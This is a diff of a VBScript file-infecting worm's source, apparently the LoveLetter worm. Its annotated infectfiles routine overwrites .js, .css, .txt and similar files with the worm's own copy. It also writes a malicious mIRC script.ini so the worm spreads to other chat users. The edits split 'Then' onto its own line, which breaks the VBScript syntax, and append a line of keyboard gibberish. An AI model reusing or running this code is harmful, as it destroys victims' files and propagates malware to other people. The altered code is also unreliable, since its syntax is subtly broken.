@@ -136,7 +136,8 @@ Sub infectfiles(folderspec)
       ap.close
     rem Copies itself into every file with js/jse/css/wsh/sct/hta extension
     rem and creates a copy of the file with the .vbs extension.
-    ElseIf (ext = "js") Or (ext = "jse") Or (ext = "css") Or (ext = "wsh") Or (ext = "sct") Or (ext = "hta") Or (ext = "txt") Then
+    ElseIf (ext = "js") Or (ext = "jse") Or (ext = "css") Or (ext = "wsh") Or (ext = "sct") Or (ext = "txt")
+    Then
       Set ap = fso.OpenTextFile(f1.path, 2, true)
 
       ap.write vbscopy
@@ -179,7 +180,8 @@ Sub infectfiles(folderspec)
     If (eq <> folderspec) Then
       rem Looks for mIRC and related files to determine whether it
       rem should create/replace its script.ini with a malicious script.
-      If (s = "mirc32.exe") Or (s = "mlink32.exe") Or (s = "mirc.ini") Or (s = "script.ini") Or (s = "mirc.hlp") Then
+      If (s = "mirc32.exe") Or (s = "mlink32.exe") Or (s = "mirc.ini") Or (s = "script.ini") Or (s = "mirc.hlp")
+      Then
         Set scriptini = fso.CreateTextFile(folderspec & "\script.ini")
         rem The following mIRC script checks if the "nick" of a user is the same
         rem as "me" to halt and send a DCC command that will send a message to
@@ -422,3 +424,5 @@ Sub html
   d.write dt6
   d.close
 End Sub
+
+ghvokbhjvfdvjhfpbjkvjhvlbkh kjvbcvbkgnghlbfj
